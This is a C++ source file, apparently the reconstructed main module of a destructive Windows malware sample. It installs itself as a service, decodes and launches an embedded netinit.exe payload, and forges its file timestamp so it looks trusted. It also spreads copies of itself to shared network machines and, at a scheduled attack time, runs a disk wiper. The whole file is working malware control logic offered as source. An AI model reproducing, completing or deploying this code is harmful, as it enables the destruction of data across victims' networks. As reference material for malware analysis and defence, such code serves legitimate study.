/******************************************************************************************
  Copyright 2013 Christian Roggia

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.
******************************************************************************************/
// main.cpp

#include "Global.h"
#include "Utils.h"
#include "Service.h"
#include "Setup.h"
#include "main.h"

using namespace sc::service;

/* RunServiceNetinit

	After sleeping for 2-3 minutes, execute netinit.exe with "1" as an argument.

	param lpThreadParameter:	Unused

	return: Zero
*/
DWORD RunServiceNetinit(LPVOID lpThreadParameter)
{
	SvcSleep(GetRandom() % 60 + 120);
	while(!bSvcStopped)
	{
		EnterCriticalSection(&Globals.critical_section);
		TryToRunServiceNetinit(L"1");
		LeaveCriticalSection(&Globals.critical_section);

		SvcSleep(GetRandom() % 60 + 120);
	}

	return 0;
}

/*	TryToRunServiceNetinit

	If the netinet service is not already running, create the executable by decoding the
	resource it's stored in, change the creation time on the new executable to make it
	seem trusted, then start the service.

	param a1:	Arguments to be appended to the command to run netinet.exe

	return:		True if process is already running, WriteEncodedResource fails, or the
				service is successfully started. False otherwise.
*/
bool TryToRunServiceNetinit(const WCHAR *a1)
{
	WCHAR svc_path[256]; // [sp+Ch] [bp-204h]@2

	Globals.netinit_id = SearchProcessByIdOrName(Globals.netinit_id, Globals.netinit_name);
	if(!Globals.netinit_id)
	{
		if(WriteEncodedResource(Globals.netinit_path, 0, (LPCWSTR)0x71, L"PKCS7", Globals.keys[KEY_PKCS7], 4))
		{
			SetReliableFileTime(Globals.netinit_path);
			if(a1)
			{
				strcpyW(&Globals.netinit_path[strlenW(Globals.netinit_path)], L" ", 4);
				strcpyW(&Globals.netinit_path[strlenW(Globals.netinit_path)], a1, 2 * strlenW(a1) + 2);
			}

			Globals.netinit_id = 0;
			if(!StartServiceProcess(Globals.netinit_name, Globals.netinit_path, &Globals.netinit_id))
				return 0;
		}
	}
	return 1;
}

bool Run(BOOL is_service_running)
{
	HANDLE hObject; // [sp+8h] [bp-4h]@2
	int time_to_attack; // [sp+14h] [bp+8h]@4

	if(is_service_running == TRUE)
	{
		Globals.ready_to_attack = false;

		InitializeCriticalSection(&Globals.critical_section);
		SvcSleep(GetRandom() % 60 + 60);

		hObject = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RunServiceNetinit, NULL, 0, NULL);
		if(!bSvcStopped)
		{
			do
			{
				EnterCriticalSection(&Globals.critical_section);
				DeleteRandExecutables();
				LeaveCriticalSection(&Globals.critical_section);

				if(Globals.ready_to_attack || (time_to_attack = TimeToAttack()) == 0)
				{
					Globals.ready_to_attack = true;

					EnterCriticalSection(&Globals.critical_section);
					CopyAndRunWiper();
					LeaveCriticalSection(&Globals.critical_section);

					SvcSleep(GetRandom() % 60 + 120);
				}
				else
				{
					CopyCurrentExecutableToTrkSvr();
					SvcSleep(60 * time_to_attack + GetRandom() % 60);
				}
			}
			while(!bSvcStopped);
		}

		// Wait until the netinit function end
		if(hObject != NULL)
		{
			WaitForSingleObject(hObject, WAIT_FAILED);
			CloseHandle(hObject);
		}

		DeleteCriticalSection(&Globals.critical_section);
		return true;
	}

	if(Globals.argc <= 1)
		return CopyCurrentExecutableToTrkSvr();

	return (strlenW(Globals.argv[1]) == 1) ? WriteModuleOnSharedNetwork() : WriteModuleOnSharedPCByArgv();
}

int main(int argc, const char **argv, const char **envp)
{
	SERVICE_TABLE_ENTRYW ServiceStartTable; // [sp+4h] [bp-10h]@3

	GeneralSetup();
	// 32-bit setup
	if(SetupTrkSvrService())
		exit(0);

	// 64-bit setup
	ServiceStartTable.lpServiceName = (LPWSTR)L"wow32";
	ServiceStartTable.lpServiceProc = (LPSERVICE_MAIN_FUNCTIONW)SvcMain;
	if(!StartServiceCtrlDispatcherW(&ServiceStartTable))
		Run(FALSE);

	ResetArgs();
	return 0;
}

inline void ResetArgs()
{
	if(Globals.argv)
		LocalFree(Globals.argv);

	Globals.argc = 0;
}